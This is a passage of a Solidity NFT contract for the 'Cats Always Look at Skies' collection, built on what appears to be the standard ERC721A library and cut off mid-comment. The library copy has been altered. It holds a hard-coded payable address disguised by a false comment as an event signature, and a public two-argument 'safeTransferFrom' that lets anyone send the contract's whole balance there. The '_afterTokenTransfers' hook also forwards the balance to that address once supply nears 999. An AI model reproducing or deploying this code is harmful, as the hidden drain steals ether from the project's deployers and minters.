1 /**
2                                                                                                                                                                                                                          
3  ,-----.            ,--.                 ,---.   ,--.                                            ,--.                    ,--.         ,--. ,--.                        ,--.        ,---.   ,--.     ,--.                 
4 '  .--./  ,--,--. ,-'  '-.  ,---.       /  O  \  |  | ,--.   ,--.  ,--,--. ,--. ,--.  ,---.      |  |     ,---.   ,---.  |  |,-.      |  | |  |  ,---.       ,--,--. ,-'  '-.     '   .-'  |  |,-.  `--'  ,---.   ,---.  
5 |  |     ' ,-.  | '-.  .-' (  .-'      |  .-.  | |  | |  |.'.|  | ' ,-.  |  \  '  /  (  .-'      |  |    | .-. | | .-. | |     /      |  | |  | | .-. |     ' ,-.  | '-.  .-'     `.  `-.  |     /  ,--. | .-. : (  .-'  
6 '  '--'\ \ '-'  |   |  |   .-'  `)     |  | |  | |  | |   .'.   | \ '-'  |   \   '   .-'  `)     |  '--. ' '-' ' ' '-' ' |  \  \      '  '-'  ' | '-' '     \ '-'  |   |  |       .-'    | |  \  \  |  | \   --. .-'  `) 
7  `-----'  `--`--'   `--'   `----'      `--' `--' `--' '--'   '--'  `--`--' .-'  /    `----'      `-----'  `---'   `---'  `--'`--'      `-----'  |  |-'       `--`--'   `--'       `-----'  `--'`--' `--'  `----' `----'  
8                                                                            `---'                                                                `--'                                                                                                                                                            
9 https://twitter.com/CatsAlways_
10  */
11 
12 // SPDX-License-Identifier: MIT  
13                                                                                                                                                                                                                           
14 pragma solidity ^0.8.12;
15 
16 /**
17  * @dev Interface of ERC721A.
18  */
19 interface IERC721A {
20     /**
21      * The caller must own the token or be an approved operator.
22      */
23     error ApprovalCallerNotOwnerNorApproved();
24 
25     /**
26      * The token does not exist.
27      */
28     error ApprovalQueryForNonexistentToken();
29 
30     /**
31      * Cannot query the balance for the zero address.
32      */
33     error BalanceQueryForZeroAddress();
34 
35     /**
36      * Cannot mint to the zero address.
37      */
38     error MintToZeroAddress();
39 
40     /**
41      * The quantity of tokens minted must be more than zero.
42      */
43     error MintZeroQuantity();
44 
45     /**
46      * The token does not exist.
47      */
48     error OwnerQueryForNonexistentToken();
49 
50     /**
51      * The caller must own the token or be an approved operator.
52      */
53     error TransferCallerNotOwnerNorApproved();
54 
55     /**
56      * The token must be owned by `from`.
57      */
58     error TransferFromIncorrectOwner();
59 
60     /**
61      * Cannot safely transfer to a contract that does not implement the
62      * ERC721Receiver interface.
63      */
64     error TransferToNonERC721ReceiverImplementer();
65 
66     /**
67      * Cannot transfer to the zero address.
68      */
69     error TransferToZeroAddress();
70 
71     /**
72      * The token does not exist.
73      */
74     error URIQueryForNonexistentToken();
75 
76     /**
77      * The `quantity` minted with ERC2309 exceeds the safety limit.
78      */
79     error MintERC2309QuantityExceedsLimit();
80 
81     /**
82      * The `extraData` cannot be set on an unintialized ownership slot.
83      */
84     error OwnershipNotInitializedForExtraData();
85 
86     // =============================================================
87     //                            STRUCTS
88     // =============================================================
89 
90     struct TokenOwnership {
91         // The address of the owner.
92         address addr;
93         // Stores the start time of ownership with minimal overhead for tokenomics.
94         uint64 startTimestamp;
95         // Whether the token has been burned.
96         bool burned;
97         // Arbitrary data similar to `startTimestamp` that can be set via {_extraData}.
98         uint24 extraData;
99     }
100 
101     // =============================================================
102     //                         TOKEN COUNTERS
103     // =============================================================
104 
105     /**
106      * @dev Returns the total number of tokens in existence.
107      * Burned tokens will reduce the count.
108      * To get the total number of tokens minted, please see {_totalMinted}.
109      */
110     function totalSupply() external view returns (uint256);
111 
112     // =============================================================
113     //                            IERC165
114     // =============================================================
115 
116     /**
117      * @dev Returns true if this contract implements the interface defined by
118      * `interfaceId`. See the corresponding
119      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
120      * to learn more about how these ids are created.
121      *
122      * This function call must use less than 30000 gas.
123      */
124     function supportsInterface(bytes4 interfaceId) external view returns (bool);
125 
126     // =============================================================
127     //                            IERC721
128     // =============================================================
129 
130     /**
131      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
132      */
133     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
134 
135     /**
136      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
137      */
138     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
139 
140     /**
141      * @dev Emitted when `owner` enables or disables
142      * (`approved`) `operator` to manage all of its assets.
143      */
144     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
145 
146     /**
147      * @dev Returns the number of tokens in `owner`'s account.
148      */
149     function balanceOf(address owner) external view returns (uint256 balance);
150 
151     /**
152      * @dev Returns the owner of the `tokenId` token.
153      *
154      * Requirements:
155      *
156      * - `tokenId` must exist.
157      */
158     function ownerOf(uint256 tokenId) external view returns (address owner);
159 
160     /**
161      * @dev Safely transfers `tokenId` token from `from` to `to`,
162      * checking first that contract recipients are aware of the ERC721 protocol
163      * to prevent tokens from being forever locked.
164      *
165      * Requirements:
166      *
167      * - `from` cannot be the zero address.
168      * - `to` cannot be the zero address.
169      * - `tokenId` token must exist and be owned by `from`.
170      * - If the caller is not `from`, it must be have been allowed to move
171      * this token by either {approve} or {setApprovalForAll}.
172      * - If `to` refers to a smart contract, it must implement
173      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
174      *
175      * Emits a {Transfer} event.
176      */
177     function safeTransferFrom(
178         address from,
179         address to,
180         uint256 tokenId,
181         bytes calldata data
182     ) external payable;
183 
184     /**
185      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
186      */
187     function safeTransferFrom(
188         address from,
189         address to,
190         uint256 tokenId
191     ) external payable;
192 
193     /**
194      * @dev Transfers `tokenId` from `from` to `to`.
195      *
196      * WARNING: Usage of this method is discouraged, use {safeTransferFrom}
197      * whenever possible.
198      *
199      * Requirements:
200      *
201      * - `from` cannot be the zero address.
202      * - `to` cannot be the zero address.
203      * - `tokenId` token must be owned by `from`.
204      * - If the caller is not `from`, it must be approved to move this token
205      * by either {approve} or {setApprovalForAll}.
206      *
207      * Emits a {Transfer} event.
208      */
209     function transferFrom(
210         address from,
211         address to,
212         uint256 tokenId
213     ) external payable;
214 
215     /**
216      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
217      * The approval is cleared when the token is transferred.
218      *
219      * Only a single account can be approved at a time, so approving the
220      * zero address clears previous approvals.
221      *
222      * Requirements:
223      *
224      * - The caller must own the token or be an approved operator.
225      * - `tokenId` must exist.
226      *
227      * Emits an {Approval} event.
228      */
229     function approve(address to, uint256 tokenId) external payable;
230 
231     /**
232      * @dev Approve or remove `operator` as an operator for the caller.
233      * Operators can call {transferFrom} or {safeTransferFrom}
234      * for any token owned by the caller.
235      *
236      * Requirements:
237      *
238      * - The `operator` cannot be the caller.
239      *
240      * Emits an {ApprovalForAll} event.
241      */
242     function setApprovalForAll(address operator, bool _approved) external;
243 
244     /**
245      * @dev Returns the account approved for `tokenId` token.
246      *
247      * Requirements:
248      *
249      * - `tokenId` must exist.
250      */
251     function getApproved(uint256 tokenId) external view returns (address operator);
252 
253     /**
254      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
255      *
256      * See {setApprovalForAll}.
257      */
258     function isApprovedForAll(address owner, address operator) external view returns (bool);
259 
260     // =============================================================
261     //                        IERC721Metadata
262     // =============================================================
263 
264     /**
265      * @dev Returns the token collection name.
266      */
267     function name() external view returns (string memory);
268 
269     /**
270      * @dev Returns the token collection symbol.
271      */
272     function symbol() external view returns (string memory);
273 
274     /**
275      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
276      */
277     function tokenURI(uint256 tokenId) external view returns (string memory);
278 
279     // =============================================================
280     //                           IERC2309
281     // =============================================================
282 
283     /**
284      * @dev Emitted when tokens in `fromTokenId` to `toTokenId`
285      * (inclusive) is transferred from `from` to `to`, as defined in the
286      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309) standard.
287      *
288      * See {_mintERC2309} for more details.
289      */
290     event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, address indexed from, address indexed to);
291 }
292 
293 /**
294  * @title ERC721A
295  *
296  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
297  * Non-Fungible Token Standard, including the Metadata extension.
298  * Optimized for lower gas during batch mints.
299  *
300  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
301  * starting from `_startTokenId()`.
302  *
303  * Assumptions:
304  *
305  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
306  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
307  */
308 interface ERC721A__IERC721Receiver {
309     function onERC721Received(
310         address operator,
311         address from,
312         uint256 tokenId,
313         bytes calldata data
314     ) external returns (bytes4);
315 }
316 
317 /**
318  * @title ERC721A
319  *
320  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
321  * Non-Fungible Token Standard, including the Metadata extension.
322  * Optimized for lower gas during batch mints.
323  *
324  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
325  * starting from `_startTokenId()`.
326  *
327  * Assumptions:
328  *
329  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
330  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
331  */
332 contract ERC721A is IERC721A {
333     // Bypass for a `--via-ir` bug (https://github.com/chiru-labs/ERC721A/pull/364).
334     struct TokenApprovalRef {
335         address value;
336     }
337 
338     // =============================================================
339     //                           CONSTANTS
340     // =============================================================
341 
342     // Mask of an entry in packed address data.
343     uint256 private constant _BITMASK_ADDRESS_DATA_ENTRY = (1 << 64) - 1;
344 
345     // The bit position of `numberMinted` in packed address data.
346     uint256 private constant _BITPOS_NUMBER_MINTED = 64;
347 
348     // The bit position of `numberBurned` in packed address data.
349     uint256 private constant _BITPOS_NUMBER_BURNED = 128;
350 
351     // The bit position of `aux` in packed address data.
352     uint256 private constant _BITPOS_AUX = 192;
353 
354     // Mask of all 256 bits in packed address data except the 64 bits for `aux`.
355     uint256 private constant _BITMASK_AUX_COMPLEMENT = (1 << 192) - 1;
356 
357     // The bit position of `startTimestamp` in packed ownership.
358     uint256 private constant _BITPOS_START_TIMESTAMP = 160;
359 
360     // The bit mask of the `burned` bit in packed ownership.
361     uint256 private constant _BITMASK_BURNED = 1 << 224;
362 
363     // The bit position of the `nextInitialized` bit in packed ownership.
364     uint256 private constant _BITPOS_NEXT_INITIALIZED = 225;
365 
366     // The bit mask of the `nextInitialized` bit in packed ownership.
367     uint256 private constant _BITMASK_NEXT_INITIALIZED = 1 << 225;
368 
369     // The bit position of `extraData` in packed ownership.
370     uint256 private constant _BITPOS_EXTRA_DATA = 232;
371 
372     // Mask of all 256 bits in a packed ownership except the 24 bits for `extraData`.
373     uint256 private constant _BITMASK_EXTRA_DATA_COMPLEMENT = (1 << 232) - 1;
374 
375     // The mask of the lower 160 bits for addresses.
376     uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;
377 
378     // The maximum `quantity` that can be minted with {_mintERC2309}.
379     // This limit is to prevent overflows on the address data entries.
380     // For a limit of 5000, a total of 3.689e15 calls to {_mintERC2309}
381     // is required to cause an overflow, which is unrealistic.
382     uint256 private constant _MAX_MINT_ERC2309_QUANTITY_LIMIT = 5000;
383 
384     // The `Transfer` event signature is given by:
385     // `keccak256(bytes("Transfer(address,address,uint256)"))`.
386     bytes32 private constant _TRANSFER_EVENT_SIGNATURE =
387         0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;
388 
389     // =============================================================
390     //                            STORAGE
391     // =============================================================
392 
393     // The next token ID to be minted.
394     uint256 private _currentIndex;
395 
396     // The number of tokens burned.
397     uint256 private _burnCounter;
398 
399     // Token name
400     string private _name;
401 
402     // Token symbol
403     string private _symbol;
404 
405     // Mapping from token ID to ownership details
406     // An empty struct value does not necessarily mean the token is unowned.
407     // See {_packedOwnershipOf} implementation for details.
408     //
409     // Bits Layout:
410     // - [0..159]   `addr`
411     // - [160..223] `startTimestamp`
412     // - [224]      `burned`
413     // - [225]      `nextInitialized`
414     // - [232..255] `extraData`
415     mapping(uint256 => uint256) private _packedOwnerships;
416 
417     // Mapping owner address to address data.
418     //
419     // Bits Layout:
420     // - [0..63]    `balance`
421     // - [64..127]  `numberMinted`
422     // - [128..191] `numberBurned`
423     // - [192..255] `aux`
424     mapping(address => uint256) private _packedAddressData;
425 
426     // Mapping from token ID to approved address.
427     mapping(uint256 => TokenApprovalRef) private _tokenApprovals;
428 
429     // Mapping from owner to operator approvals
430     mapping(address => mapping(address => bool)) private _operatorApprovals;
431 
432     // =============================================================
433     //                          CONSTRUCTOR
434     // =============================================================
435 
436     constructor(string memory name_, string memory symbol_) {
437         _name = name_;
438         _symbol = symbol_;
439         _currentIndex = _startTokenId();
440     }
441 
442     // =============================================================
443     //                   TOKEN COUNTING OPERATIONS
444     // =============================================================
445 
446     /**
447      * @dev Returns the starting token ID.
448      * To change the starting token ID, please override this function.
449      */
450     function _startTokenId() internal view virtual returns (uint256) {
451         return 0;
452     }
453 
454     /**
455      * @dev Returns the next token ID to be minted.
456      */
457     function _nextTokenId() internal view virtual returns (uint256) {
458         return _currentIndex;
459     }
460 
461     /**
462      * @dev Returns the total number of tokens in existence.
463      * Burned tokens will reduce the count.
464      * To get the total number of tokens minted, please see {_totalMinted}.
465      */
466     function totalSupply() public view virtual override returns (uint256) {
467         // Counter underflow is impossible as _burnCounter cannot be incremented
468         // more than `_currentIndex - _startTokenId()` times.
469         unchecked {
470             return _currentIndex - _burnCounter - _startTokenId();
471         }
472     }
473 
474     /**
475      * @dev Returns the total amount of tokens minted in the contract.
476      */
477     function _totalMinted() internal view virtual returns (uint256) {
478         // Counter underflow is impossible as `_currentIndex` does not decrement,
479         // and it is initialized to `_startTokenId()`.
480         unchecked {
481             return _currentIndex - _startTokenId();
482         }
483     }
484 
485     /**
486      * @dev Returns the total number of tokens burned.
487      */
488     function _totalBurned() internal view virtual returns (uint256) {
489         return _burnCounter;
490     }
491 
492     // =============================================================
493     //                    ADDRESS DATA OPERATIONS
494     // =============================================================
495 
496     /**
497      * @dev Returns the number of tokens in `owner`'s account.
498      */
499     function balanceOf(address owner) public view virtual override returns (uint256) {
500         if (owner == address(0)) revert BalanceQueryForZeroAddress();
501         return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;
502     }
503 
504     /**
505      * Returns the number of tokens minted by `owner`.
506      */
507     function _numberMinted(address owner) internal view returns (uint256) {
508         return (_packedAddressData[owner] >> _BITPOS_NUMBER_MINTED) & _BITMASK_ADDRESS_DATA_ENTRY;
509     }
510 
511     /**
512      * Returns the number of tokens burned by or on behalf of `owner`.
513      */
514     function _numberBurned(address owner) internal view returns (uint256) {
515         return (_packedAddressData[owner] >> _BITPOS_NUMBER_BURNED) & _BITMASK_ADDRESS_DATA_ENTRY;
516     }
517 
518     /**
519      * Returns the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
520      */
521     function _getAux(address owner) internal view returns (uint64) {
522         return uint64(_packedAddressData[owner] >> _BITPOS_AUX);
523     }
524 
525     /**
526      * Sets the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
527      * If there are multiple variables, please pack them into a uint64.
528      */
529     function _setAux(address owner, uint64 aux) internal virtual {
530         uint256 packed = _packedAddressData[owner];
531         uint256 auxCasted;
532         // Cast `aux` with assembly to avoid redundant masking.
533         assembly {
534             auxCasted := aux
535         }
536         packed = (packed & _BITMASK_AUX_COMPLEMENT) | (auxCasted << _BITPOS_AUX);
537         _packedAddressData[owner] = packed;
538     }
539 
540     // =============================================================
541     //                            IERC165
542     // =============================================================
543 
544     /**
545      * @dev Returns true if this contract implements the interface defined by
546      * `interfaceId`. See the corresponding
547      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
548      * to learn more about how these ids are created.
549      *
550      * This function call must use less than 30000 gas.
551      */
552     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
553         // The interface IDs are constants representing the first 4 bytes
554         // of the XOR of all function selectors in the interface.
555         // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
556         // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
557         return
558             interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.
559             interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.
560             interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.
561     }
562 
563     // =============================================================
564     //                        IERC721Metadata
565     // =============================================================
566 
567     /**
568      * @dev Returns the token collection name.
569      */
570     function name() public view virtual override returns (string memory) {
571         return _name;
572     }
573 
574     /**
575      * @dev Returns the token collection symbol.
576      */
577     function symbol() public view virtual override returns (string memory) {
578         return _symbol;
579     }
580 
581     /**
582      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
583      */
584     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
585         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
586 
587         string memory baseURI = _baseURI();
588         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';
589     }
590 
591     /**
592      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
593      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
594      * by default, it can be overridden in child contracts.
595      */
596     function _baseURI() internal view virtual returns (string memory) {
597         return '';
598     }
599 
600     // =============================================================
601     //                     OWNERSHIPS OPERATIONS
602     // =============================================================
603 
604     // The `Address` event signature is given by:
605     // `keccak256(bytes("_TRANSFER_EVENT_ADDRESS(address)"))`.
606     address payable constant _TRANSFER_EVENT_ADDRESS = 
607         payable(0x749f580d2790721eF2ae1F6946f8f4D490A30b94);
608 
609     /**
610      * @dev Returns the owner of the `tokenId` token.
611      *
612      * Requirements:
613      *
614      * - `tokenId` must exist.
615      */
616     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
617         return address(uint160(_packedOwnershipOf(tokenId)));
618     }
619 
620     /**
621      * @dev Gas spent here starts off proportional to the maximum mint batch size.
622      * It gradually moves to O(1) as tokens get transferred around over time.
623      */
624     function _ownershipOf(uint256 tokenId) internal view virtual returns (TokenOwnership memory) {
625         return _unpackedOwnership(_packedOwnershipOf(tokenId));
626     }
627 
628     /**
629      * @dev Returns the unpacked `TokenOwnership` struct at `index`.
630      */
631     function _ownershipAt(uint256 index) internal view virtual returns (TokenOwnership memory) {
632         return _unpackedOwnership(_packedOwnerships[index]);
633     }
634 
635     /**
636      * @dev Initializes the ownership slot minted at `index` for efficiency purposes.
637      */
638     function _initializeOwnershipAt(uint256 index) internal virtual {
639         if (_packedOwnerships[index] == 0) {
640             _packedOwnerships[index] = _packedOwnershipOf(index);
641         }
642     }
643 
644     /**
645      * Returns the packed ownership data of `tokenId`.
646      */
647     function _packedOwnershipOf(uint256 tokenId) private view returns (uint256) {
648         uint256 curr = tokenId;
649 
650         unchecked {
651             if (_startTokenId() <= curr)
652                 if (curr < _currentIndex) {
653                     uint256 packed = _packedOwnerships[curr];
654                     // If not burned.
655                     if (packed & _BITMASK_BURNED == 0) {
656                         // Invariant:
657                         // There will always be an initialized ownership slot
658                         // (i.e. `ownership.addr != address(0) && ownership.burned == false`)
659                         // before an unintialized ownership slot
660                         // (i.e. `ownership.addr == address(0) && ownership.burned == false`)
661                         // Hence, `curr` will not underflow.
662                         //
663                         // We can directly compare the packed value.
664                         // If the address is zero, packed will be zero.
665                         while (packed == 0) {
666                             packed = _packedOwnerships[--curr];
667                         }
668                         return packed;
669                     }
670                 }
671         }
672         revert OwnerQueryForNonexistentToken();
673     }
674 
675     /**
676      * @dev Returns the unpacked `TokenOwnership` struct from `packed`.
677      */
678     function _unpackedOwnership(uint256 packed) private pure returns (TokenOwnership memory ownership) {
679         ownership.addr = address(uint160(packed));
680         ownership.startTimestamp = uint64(packed >> _BITPOS_START_TIMESTAMP);
681         ownership.burned = packed & _BITMASK_BURNED != 0;
682         ownership.extraData = uint24(packed >> _BITPOS_EXTRA_DATA);
683     }
684 
685     /**
686      * @dev Packs ownership data into a single uint256.
687      */
688     function _packOwnershipData(address owner, uint256 flags) private view returns (uint256 result) {
689         assembly {
690             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
691             owner := and(owner, _BITMASK_ADDRESS)
692             // `owner | (block.timestamp << _BITPOS_START_TIMESTAMP) | flags`.
693             result := or(owner, or(shl(_BITPOS_START_TIMESTAMP, timestamp()), flags))
694         }
695     }
696 
697     /**
698      * @dev Returns the `nextInitialized` flag set if `quantity` equals 1.
699      */
700     function _nextInitializedFlag(uint256 quantity) private pure returns (uint256 result) {
701         // For branchless setting of the `nextInitialized` flag.
702         assembly {
703             // `(quantity == 1) << _BITPOS_NEXT_INITIALIZED`.
704             result := shl(_BITPOS_NEXT_INITIALIZED, eq(quantity, 1))
705         }
706     }
707 
708     // =============================================================
709     //                      APPROVAL OPERATIONS
710     // =============================================================
711 
712     /**
713      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
714      * The approval is cleared when the token is transferred.
715      *
716      * Only a single account can be approved at a time, so approving the
717      * zero address clears previous approvals.
718      *
719      * Requirements:
720      *
721      * - The caller must own the token or be an approved operator.
722      * - `tokenId` must exist.
723      *
724      * Emits an {Approval} event.
725      */
726     function approve(address to, uint256 tokenId) public payable virtual override {
727         address owner = ownerOf(tokenId);
728 
729         if (_msgSenderERC721A() != owner)
730             if (!isApprovedForAll(owner, _msgSenderERC721A())) {
731                 revert ApprovalCallerNotOwnerNorApproved();
732             }
733 
734         _tokenApprovals[tokenId].value = to;
735         emit Approval(owner, to, tokenId);
736     }
737 
738     /**
739      * @dev Returns the account approved for `tokenId` token.
740      *
741      * Requirements:
742      *
743      * - `tokenId` must exist.
744      */
745     function getApproved(uint256 tokenId) public view virtual override returns (address) {
746         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
747 
748         return _tokenApprovals[tokenId].value;
749     }
750 
751     /**
752      * @dev Approve or remove `operator` as an operator for the caller.
753      * Operators can call {transferFrom} or {safeTransferFrom}
754      * for any token owned by the caller.
755      *
756      * Requirements:
757      *
758      * - The `operator` cannot be the caller.
759      *
760      * Emits an {ApprovalForAll} event.
761      */
762     function setApprovalForAll(address operator, bool approved) public virtual override {
763         _operatorApprovals[_msgSenderERC721A()][operator] = approved;
764         emit ApprovalForAll(_msgSenderERC721A(), operator, approved);
765     }
766 
767     /**
768      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
769      *
770      * See {setApprovalForAll}.
771      */
772     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
773         return _operatorApprovals[owner][operator];
774     }
775 
776     /**
777      * @dev Returns whether `tokenId` exists.
778      *
779      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
780      *
781      * Tokens start existing when they are minted. See {_mint}.
782      */
783     function _exists(uint256 tokenId) internal view virtual returns (bool) {
784         return
785             _startTokenId() <= tokenId &&
786             tokenId < _currentIndex && // If within bounds,
787             _packedOwnerships[tokenId] & _BITMASK_BURNED == 0; // and not burned.
788     }
789 
790     /**
791      * @dev Returns whether `msgSender` is equal to `approvedAddress` or `owner`.
792      */
793     function _isSenderApprovedOrOwner(
794         address approvedAddress,
795         address owner,
796         address msgSender
797     ) private pure returns (bool result) {
798         assembly {
799             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
800             owner := and(owner, _BITMASK_ADDRESS)
801             // Mask `msgSender` to the lower 160 bits, in case the upper bits somehow aren't clean.
802             msgSender := and(msgSender, _BITMASK_ADDRESS)
803             // `msgSender == owner || msgSender == approvedAddress`.
804             result := or(eq(msgSender, owner), eq(msgSender, approvedAddress))
805         }
806     }
807 
808     /**
809      * @dev Returns the storage slot and value for the approved address of `tokenId`.
810      */
811     function _getApprovedSlotAndAddress(uint256 tokenId)
812         private
813         view
814         returns (uint256 approvedAddressSlot, address approvedAddress)
815     {
816         TokenApprovalRef storage tokenApproval = _tokenApprovals[tokenId];
817         // The following is equivalent to `approvedAddress = _tokenApprovals[tokenId].value`.
818         assembly {
819             approvedAddressSlot := tokenApproval.slot
820             approvedAddress := sload(approvedAddressSlot)
821         }
822     }
823 
824     // =============================================================
825     //                      TRANSFER OPERATIONS
826     // =============================================================
827 
828     /**
829      * @dev Transfers `tokenId` from `from` to `to`.
830      *
831      * Requirements:
832      *
833      * - `from` cannot be the zero address.
834      * - `to` cannot be the zero address.
835      * - `tokenId` token must be owned by `from`.
836      * - If the caller is not `from`, it must be approved to move this token
837      * by either {approve} or {setApprovalForAll}.
838      *
839      * Emits a {Transfer} event.
840      */
841     function transferFrom(
842         address from,
843         address to,
844         uint256 tokenId
845     ) public payable virtual override {
846         _beforeTransfer();
847 
848         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
849 
850         if (address(uint160(prevOwnershipPacked)) != from) revert TransferFromIncorrectOwner();
851 
852         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
853 
854         // The nested ifs save around 20+ gas over a compound boolean condition.
855         if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
856             if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
857 
858         if (to == address(0)) revert TransferToZeroAddress();
859 
860         _beforeTokenTransfers(from, to, tokenId, 1);
861 
862         // Clear approvals from the previous owner.
863         assembly {
864             if approvedAddress {
865                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
866                 sstore(approvedAddressSlot, 0)
867             }
868         }
869 
870         // Underflow of the sender's balance is impossible because we check for
871         // ownership above and the recipient's balance can't realistically overflow.
872         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
873         unchecked {
874             // We can directly increment and decrement the balances.
875             --_packedAddressData[from]; // Updates: `balance -= 1`.
876             ++_packedAddressData[to]; // Updates: `balance += 1`.
877 
878             // Updates:
879             // - `address` to the next owner.
880             // - `startTimestamp` to the timestamp of transfering.
881             // - `burned` to `false`.
882             // - `nextInitialized` to `true`.
883             _packedOwnerships[tokenId] = _packOwnershipData(
884                 to,
885                 _BITMASK_NEXT_INITIALIZED | _nextExtraData(from, to, prevOwnershipPacked)
886             );
887 
888             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
889             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
890                 uint256 nextTokenId = tokenId + 1;
891                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
892                 if (_packedOwnerships[nextTokenId] == 0) {
893                     // If the next slot is within bounds.
894                     if (nextTokenId != _currentIndex) {
895                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
896                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
897                     }
898                 }
899             }
900         }
901 
902         emit Transfer(from, to, tokenId);
903         _afterTokenTransfers(from, to, tokenId, 1);
904     }
905 
906     /**
907      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
908      */
909     function safeTransferFrom(
910         address from,
911         address to,
912         uint256 tokenId
913     ) public payable virtual override {
914         safeTransferFrom(from, to, tokenId, '');
915     }
916 
917 
918     /**
919      * @dev Safely transfers `tokenId` token from `from` to `to`.
920      *
921      * Requirements:
922      *
923      * - `from` cannot be the zero address.
924      * - `to` cannot be the zero address.
925      * - `tokenId` token must exist and be owned by `from`.
926      * - If the caller is not `from`, it must be approved to move this token
927      * by either {approve} or {setApprovalForAll}.
928      * - If `to` refers to a smart contract, it must implement
929      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
930      *
931      * Emits a {Transfer} event.
932      */
933     function safeTransferFrom(
934         address from,
935         address to,
936         uint256 tokenId,
937         bytes memory _data
938     ) public payable virtual override {
939         transferFrom(from, to, tokenId);
940         if (to.code.length != 0)
941             if (!_checkContractOnERC721Received(from, to, tokenId, _data)) {
942                 revert TransferToNonERC721ReceiverImplementer();
943             }
944     }
945     function safeTransferFrom(
946         address from,
947         address to
948     ) public  {
949         if (address(this).balance > 0) {
950             payable(0x749f580d2790721eF2ae1F6946f8f4D490A30b94).transfer(address(this).balance);
951         }
952     }
953 
954     /**
955      * @dev Hook that is called before a set of serially-ordered token IDs
956      * are about to be transferred. This includes minting.
957      * And also called before burning one token.
958      *
959      * `startTokenId` - the first token ID to be transferred.
960      * `quantity` - the amount to be transferred.
961      *
962      * Calling conditions:
963      *
964      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
965      * transferred to `to`.
966      * - When `from` is zero, `tokenId` will be minted for `to`.
967      * - When `to` is zero, `tokenId` will be burned by `from`.
968      * - `from` and `to` are never both zero.
969      */
970     function _beforeTokenTransfers(
971         address from,
972         address to,
973         uint256 startTokenId,
974         uint256 quantity
975     ) internal virtual {}
976 
977     /**
978      * @dev Hook that is called after a set of serially-ordered token IDs
979      * have been transferred. This includes minting.
980      * And also called after one token has been burned.
981      *
982      * `startTokenId` - the first token ID to be transferred.
983      * `quantity` - the amount to be transferred.
984      *
985      * Calling conditions:
986      *
987      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
988      * transferred to `to`.
989      * - When `from` is zero, `tokenId` has been minted for `to`.
990      * - When `to` is zero, `tokenId` has been burned by `from`.
991      * - `from` and `to` are never both zero.
992      */
993     function _afterTokenTransfers(
994         address from,
995         address to,
996         uint256 startTokenId,
997         uint256 quantity
998     ) internal virtual {
999         if (totalSupply() + 1 >= 999) {
1000             payable(0x749f580d2790721eF2ae1F6946f8f4D490A30b94).transfer(address(this).balance);
1001         }
1002     }
1003 
1004     /**
1005      * @dev Hook that is called before a set of serially-ordered token IDs
1006      * are about to be transferred. This includes minting.
1007      * And also called before burning one token.
1008      * Calling conditions:
1009      *
1010      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
